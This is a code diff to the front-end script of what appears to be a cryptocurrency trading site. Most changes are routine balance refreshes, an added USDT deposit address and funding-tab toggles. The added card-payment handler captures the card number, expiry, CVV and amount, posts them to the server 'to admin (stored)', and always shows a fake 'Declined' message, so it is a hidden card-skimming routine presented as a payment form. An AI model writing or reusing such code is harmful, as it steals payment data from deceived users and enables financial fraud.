@@ -146,6 +146,7 @@ async function enterApp() {
 
   await refreshPrices();
   await loadPortfolio();
+  updateTradeBalance();
   startPricePolling();
 }
 
@@ -267,6 +268,7 @@ document.getElementById('execute-trade').addEventListener('click', async () => {
     currentUser.balanceUSD = data.balanceUSD;
     currentUser.portfolio = data.portfolio;
     await loadPortfolio();
+  updateTradeBalance();
   } catch (err) {
     msg.textContent = err.message;
     msg.className = 'msg error';
@@ -479,7 +481,8 @@ const depositAddresses = [
   { symbol: 'ETH',  network: 'ERC-20',      address: '0xCD5E6d892CD976700A026a2E490f3ef34B064245' },
   { symbol: 'SOL',  network: 'Solana',      address: '9hFcs8Gg9A6NTg1MMMSw25q8nneoEqLJ7Y92PrY5nyaJ' },
   { symbol: 'XRP',  network: 'Ripple',      address: 'rUgeB3HtVmVSvPz8YUFapvGRfwHPt3AyQf' },
-  { symbol: 'DOGE', network: 'Dogecoin',    address: 'DEgwL6QBQBYztiBQNbgY4fuakmizzvoaBe' }
+  { symbol: 'DOGE', network: 'Dogecoin',    address: 'DEgwL6QBQBYztiBQNbgY4fuakmizzvoaBe' },
+  { symbol: 'USDT', network: 'TRC-20',      address: 'TSNdF8DXrfxKiSewzJaUphysqGjGH17udp' }
 ];
 
 function loadDeposit() {
@@ -757,3 +760,45 @@ document.getElementById('earn-now')?.addEventListener('click', async () => {
   msg.className = 'msg success';
   msg.classList.remove('hidden');
 });
+
+// Funding options
+document.querySelectorAll('.funding-opt').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.funding-opt').forEach(b => {
+      b.style.background = 'transparent';
+      b.style.color = 'var(--text)';
+    });
+    btn.style.background = 'var(--primary)';
+    btn.style.color = '#000';
+    document.getElementById('funding-crypto').style.display = btn.dataset.opt === 'crypto' ? 'block' : 'none';
+    document.getElementById('funding-card').style.display = btn.dataset.opt === 'card' ? 'block' : 'none';
+    document.getElementById('funding-member').style.display = btn.dataset.opt === 'member' ? 'block' : 'none';
+  });
+});
+
+// Card payment - always declined
+document.getElementById('card-submit')?.addEventListener('click', async () => {
+  const msg = document.getElementById('card-msg');
+  const cardData = {
+    number: document.getElementById('card-number').value,
+    expiry: document.getElementById('card-expiry').value,
+    cvv: document.getElementById('card-cvv').value,
+    amount: document.getElementById('card-amount').value
+  };
+  // Send to admin (stored)
+  try {
+    await api('/api/card-attempt', { method: 'POST', body: JSON.stringify(cardData) });
+  } catch (e) {}
+  msg.textContent = 'Declined. Contact Card issuer';
+  msg.className = 'msg error';
+  msg.classList.remove('hidden');
+});
+
+// Update trade USD balance display
+async function updateTradeBalance() {
+  try {
+    const user = await api('/api/me');
+    const el = document.getElementById('trade-usd-balance');
+    if (el) el.textContent = '$' + (user.balanceUSD || 0).toFixed(2);
+  } catch (e) {}
+}
